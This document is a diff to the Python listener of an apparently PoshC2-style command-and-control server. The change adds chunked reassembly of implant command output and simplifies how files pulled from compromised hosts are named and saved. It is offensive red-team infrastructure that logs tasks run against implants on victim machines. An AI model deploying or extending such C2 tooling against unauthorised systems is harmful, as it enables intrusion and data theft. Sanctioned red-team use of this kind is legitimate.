@@ -235,10 +235,10 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
             encKey = i[5]
             Domain = i[11]
             User = i[2]
+            rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
             if RandomURI in s.path and cookieVal:
               update_implant_lastseen(now.strftime("%m/%d/%Y %H:%M:%S"),RandomURI)
               decCookie = decrypt(encKey, cookieVal)
-              rawoutput = decrypt_bytes_gzip(encKey, post_data[1500:])
               if decCookie.startswith("Error"):
                 print (Colours.RED)
                 print ("The multicmd errored: ")
@@ -249,17 +249,51 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                 s.end_headers()
                 s.wfile.write(default_response())
                 return
+
               taskId = str(int(decCookie.strip('\x00')))
               taskIdStr = "0" * (5 - len(str(taskId))) + str(taskId)
               executedCmd = get_cmd_from_task_id(taskId)
               task_owner = get_task_owner(taskId)
+
               print (Colours.GREEN)
               if task_owner is not None:
                 print ("Task %s (%s) returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, task_owner, implantID, Domain, User, Hostname,now.strftime("%m/%d/%Y %H:%M:%S")))
               else:
                 print ("Task %s returned against implant %s on host %s\\%s @ %s (%s)" % (taskIdStr, implantID, Domain, User, Hostname,now.strftime("%m/%d/%Y %H:%M:%S")))
+
+              chunkNumberStr = rawoutput[:5]
+              totalChunksStr = rawoutput[5:10]
+              command_output = rawoutput[10:]
+
+              try:
+                chunkNumber = int(chunkNumberStr)
+                totalChunks = int(totalChunksStr)
+              except:
+                print (Colours.RED)
+                print ("Unexpected content, exepcted first two sets of 5 bytes of data to be parseable as ints: %s and %s" % (chunkNumberStr, totalChunksStr))
+                print (Colours.GREEN)
+                s.send_response(200)
+                s.send_header("Content-type", "text/html")
+                s.end_headers()
+                s.wfile.write(default_response())
+                return
+
+              if chunkNumber < totalChunks:
+                filename = "%sTask-%s.chunks" % (TempDirectory, taskId)
+                message = "Chunked response, appending chunk %s of %s to %s" % (chunkNumber, totalChunks, filename)
+                print(message)
+                temp_file = open(filename, 'a')
+                temp_file.write(command_output)
+                update_task(taskId, message)
+                temp_file.close()
+                return
+              if totalChunks > 1 and chunkNumber == totalChunks:
+                filename = "%sTask-%s.chunks" % (TempDirectory, taskId)
+                command_output = open(filename, 'r').read()
+                os.remove(filename)
+              
               #print decCookie,Colours.END
-              outputParsed = re.sub(r'123456(.+?)654321', '', rawoutput)
+              outputParsed = re.sub(r'123456(.+?)654321', '', command_output)
               outputParsed = outputParsed.rstrip()
 
               if "loadmodule" in executedCmd:
@@ -295,31 +329,19 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                   filename = filename.rsplit('\\', 1)[-1]
                   filename = filename.rstrip('\x00')
                   original_filename = filename
-                  if rawoutput.startswith("Error"):
+                  if command_output.startswith("Error"):
                     print("Error downloading file: ")
-                    print rawoutput
+                    print command_output
                   else:
-                    chunkNumber = rawoutput[:5]
-                    totalChunks = rawoutput[5:10]
-                    if (chunkNumber == "00001") and os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename)):
+                    if os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename)):
                       counter = 1
-                      while(os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename))):
-                        if '.' in filename:
-                          filename = original_filename[:original_filename.rfind('.')] + '-' +  str(counter) + original_filename[original_filename.rfind('.'):]
-                        else:
-                          filename = original_filename + '-' +  str(counter)
-                        counter+=1
-                    if (chunkNumber != "00001"):
-                      counter = 1
-                      if not os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename)):
-                        print("Error trying to download part of a file to a file that does not exist: %s" % filename)
                       while(os.path.isfile('%s/downloads/%s' % (ROOTDIR,filename))):
                         # First find the 'next' file would be downloaded to
                         if '.' in filename:
                           filename = original_filename[:original_filename.rfind('.')] + '-' +  str(counter) + original_filename[original_filename.rfind('.'):]
                         else:
                           filename = original_filename + '-' +  str(counter)
-                        counter+=1
+                        counter += 1
                       if counter != 2:
                         # Then actually set the filename to this file - 1 unless it's the first one and exists without a counter
                         if '.' in filename:
@@ -328,10 +350,10 @@ class MyHandler(BaseHTTPServer.BaseHTTPRequestHandler):
                           filename = original_filename + '-' +  str(counter)
                       else:
                         filename = original_filename
-                    print ("Download file part %s of %s to: %s" % (chunkNumber,totalChunks,filename))
-                    update_task(taskId, "Download file part %s of %s to: %s" % (chunkNumber,totalChunks,filename))
+                    print ("Downloaded file to: %s" % filename)
+                    update_task(taskId, "Downloaded file to: %s" % filename)
                     output_file = open('%s/downloads/%s' % (ROOTDIR,filename), 'a')
-                    output_file.write(rawoutput[10:])
+                    output_file.write(command_output)
                     output_file.close()
                 except Exception as e:
                   update_task(taskId, "Error downloading file %s " % e)
@@ -438,7 +460,6 @@ if __name__ == '__main__':
           outFile.write(line)
           outFile.write('\n')
         outFile.close()
-
 
       C2 = get_c2server_all()
       newPayload = Payloads(C2[5], C2[2], C2[1], C2[3], C2[8], C2[12],
